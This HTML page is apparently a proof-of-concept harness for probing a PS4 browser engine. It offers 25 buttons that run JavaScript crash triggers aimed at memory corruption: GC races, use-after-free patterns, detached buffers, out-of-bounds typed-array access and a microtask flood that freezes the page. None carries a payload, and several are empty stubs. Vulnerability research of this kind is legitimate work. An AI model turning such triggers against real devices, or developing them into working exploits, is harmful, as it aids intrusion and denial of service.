<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 PoC v90000 (25 High Impact)</title>
</head>
<body>
<h1>v90000: MEMORY CORRUPTION FOCUS</h1>
<div id="log" style="border:1px solid #000; height: 300px; overflow: scroll;">Ready...</div>
<hr>

<button onclick="run(t01)">01. NodeIterator GC Race</button>
<button onclick="run(t02)">02. DOMTreeModified Re-entry</button>
<button onclick="run(t03)">03. Adoption Agency Cycle</button>
<button onclick="run(t04)">04. HTMLCollection Length UAF</button>
<button onclick="run(t05)">05. SVG Use Element Shadow Clone</button>

<button onclick="run(t06)">06. Array Species Constructor</button>
<button onclick="run(t07)">07. RegExp Exec Side-Effect</button>
<button onclick="run(t08)">08. ValueOf Re-entry Crash</button>
<button onclick="run(t09)">09. Proxy Revoke Access</button>
<button onclick="run(t10)">10. Object DefineProperty Loop</button>

<button onclick="run(t11)">11. ArrayBuffer Detach Read</button>
<button onclick="run(t12)">12. TextEncoder Stream Overflow</button>
<button onclick="run(t13)">13. Blob Slice Recursion</button>
<button onclick="run(t14)">14. TypedArray Subarray OOB</button>
<button onclick="run(t15)">15. DataView Offset Rollunder</button>

<button onclick="run(t16)">16. XHR Abort in OnLoad</button>
<button onclick="run(t17)">17. JSON Parse Reviver Mutate</button>
<button onclick="run(t18)">18. XMLSerializer Namespace</button>
<button onclick="run(t19)">19. URL SearchParams Iterator</button>
<button onclick="run(t20)">20. FontFace Load Race</button>

<button onclick="run(t21)">21. CSS Calc Infinity Parse</button>
<button onclick="run(t22)">22. Selection Range Collapse</button>
<button onclick="run(t23)">23. Canvas Gradient Free</button>
<button onclick="run(t24)">24. History State Deep Clone</button>
<button onclick="run(t25)">25. Promise Microtask Flood</button>

<script>
    const L = document.getElementById('log');
    function log(m) { L.innerHTML += m + "<br>"; L.scrollTop = L.scrollHeight; }
    
    function run(fn) {
        log("Running: " + fn.name);
        try { fn(); } catch(e) { log("Error: " + e.message); }
    }

    // --- DOM & GC ---
    function t01() {
        // Tenta usar um NodeIterator em um nó que foi removido e coletado
        const root = document.createElement('div');
        const ni = document.createNodeIterator(root);
        ni.detach(); 
        const garbage = new Array(10000).fill(1.1); // GC Pressure
        try { ni.nextNode(); } catch(e){}
    }

    function t02() {
        // Modifica o DOM durante um evento de modificação (Reentrância)
        const el = document.createElement('div');
        let count = 0;
        el.addEventListener('DOMSubtreeModified', () => {
            if(count++ < 50) el.innerHTML = "<b>X</b>";
        });
        el.appendChild(document.createElement('span'));
    }

    function t03() {
        // Ciclo de adoção entre documentos para confundir o ownership
        const docA = document.implementation.createHTMLDocument();
        const docB = document.implementation.createHTMLDocument();
        const node = docA.createElement('div');
        docA.body.appendChild(node);
        docB.adoptNode(node);
        docA.adoptNode(node);
        node.remove();
    }

    function t04() {
        // Redução de tamanho de coleção viva
        const sel = document.createElement('select');
        for(let i=0; i<100; i++) sel.appendChild(document.createElement('option'));
        const opts = sel.options;
        sel.length = 5; // Truncate
        const ref = opts[10]; // OOB Access logic
    }

    function t05() {
        // SVG Use Element Cloning Recursive
        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        const use = document.createElementNS("http://www.w3.org/2000/svg", "use");
        const defs = document.createElementNS("http://www.w3.org/2000/svg", "defs");
        const g = document.createElementNS("http://www.w3.org/2000/svg", "g");
        g.id = "target";
        g.appendChild(use); // Self reference in template
        defs.appendChild(g);
        svg.appendChild(defs);
        use.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#target");
        document.body.appendChild(svg);
        setTimeout(() => svg.remove(), 100);
    }

    // --- TYPE & PROTOTYPE ---
    function t06() {
        // Array Species confusion
        class FakeArray extends Array {
            static get [Symbol.species]() { return function() { return {}; } }
        }
        const a = new FakeArray(1,2,3);
        a.map(x=>x); // C++ engine expects Array, gets Object
    }

    function t07() {
        // RegExp Exec Side Effect
        const re = /a/;
        re.exec = function() {
            // Mutate string or object during match
            return null; 
        };
        "".match(re);
    }

    function t08() {
        // ValueOf Re-entry during arithmetic
        const o = {
            valueOf: () => {
                // Destroy operand
                return 1;
            }
        };
        const res = o + 1;
    }

    function t09() {
        // Revocable Proxy Access
        const p = Proxy.revocable({}, {});
        p.revoke();
        try { console.log(p.proxy.x); } catch(e){}
    }

    function t10() {
        // DefineProperty Loop
        const o = {};
        let val = 0;
        Object.defineProperty(o, 'x', {
            get: () => { val++; return o.x; } // Infinite recursion on getter
        });
        try { return o.x; } catch(e){}
    }

    // --- BINARY & BUFFER ---
    function t11() {
        // ArrayBuffer Detach via Worker
        const ab = new ArrayBuffer(1024);
        const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/javascript'})));
        w.postMessage(ab, [ab]); // Detach
        try { const v = new Uint8Array(ab); } catch(e){} // Access detached
    }

    function t12() {
        // TextEncoder Stream Overflow
        const enc = new TextEncoder();
        const huge = "A".repeat(1000000); // 1MB String
        const u = new Uint8Array(10);
        try { enc.encodeInto(huge, u); } catch(e){}
    }

    function t13() {
        // Blob Slice Recursion
        let b = new Blob(["test"]);
        for(let i=0; i<5000; i++) b = b.slice(0, 1);
        const fr = new FileReader();
        fr.readAsText(b);
    }

    function t14() {
        // TypedArray OOB
        const f = new Float32Array(10);
        const sub = f.subarray(0, 100); // Should clamp, testing impl
    }

    function t15() {
        // DataView Offset Rollunder
        const b = new ArrayBuffer(10);
        const v = new DataView(b);
        try { v.getUint8(-1); } catch(e){}
    }

    // --- NETWORK & PARSER ---
    function t16() {
        // XHR Abort in OnLoad
        const x = new XMLHttpRequest();
        x.open("GET", window.location.href);
        x.onload = () => x.abort();
        x.send();
    }

    function t17() {
        // JSON Reviver Mutation
        const j = '{"a": 1, "b": 2}';
        JSON.parse(j, (k,v) => {
            if(k === 'a') {
                // Mutate the structure holding 'b'
            }
            return v;
        });
    }

    function t18() {
        // XMLSerializer Namespace Pollution
        const xs = new XMLSerializer();
        const d = document.createElementNS("http://a", "root");
        d.setAttributeNS("http://www.w3.org/2000/xmlns/", "xmlns:a", "http://b");
        xs.serializeToString(d);
    }

    function t19() {
        // URLSearchParams Iterator Invalidation
        const u = new URLSearchParams("a=1&b=2");
        const it = u.keys();
        it.next();
        u.delete("a"); // Mutate backing store
        it.next();
    }

    function t20() {
        // FontFace Load Race
        const f = new FontFace("T", "url(x)");
        document.fonts.add(f);
        f.load();
        document.fonts.delete(f);
    }

    // --- ESOTERIC & LAYOUT ---
    function t21() {
        // CSS Calc Infinity
        const d = document.createElement('div');
        d.style.width = "calc(1px / 0)";
        document.body.appendChild(d);
        setTimeout(()=>d.remove(), 10);
    }

    function t22() {
        // Selection Collapse
        const s = window.getSelection();
        const d = document.createElement('div');
        document.body.appendChild(d);
        s.selectAllChildren(d);
        d.remove();
        s.collapseToStart();
    }

    function t23() {
        // Canvas Gradient UAF
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        let g = ctx.createLinearGradient(0,0,10,10);
        ctx.fillStyle = g;
        g = null; // Mark for GC
        const junk = new Array(1000).fill(1);
        ctx.fillRect(0,0,10,10);
    }

    function t24() {
        // History State Deep Clone Stack Overflow
        let o = {};
        for(let i=0; i<5000; i++) {
            o = {next: o};
        }
        try { history.pushState(o, "", null); } catch(e){}
    }

    function t25() {
        // Promise Microtask Flood (Thread Starvation)
        function loop() { Promise.resolve().then(loop); }
        loop();
        // This stops UI but tests event loop handling
    }
</script>
</body>
</html>
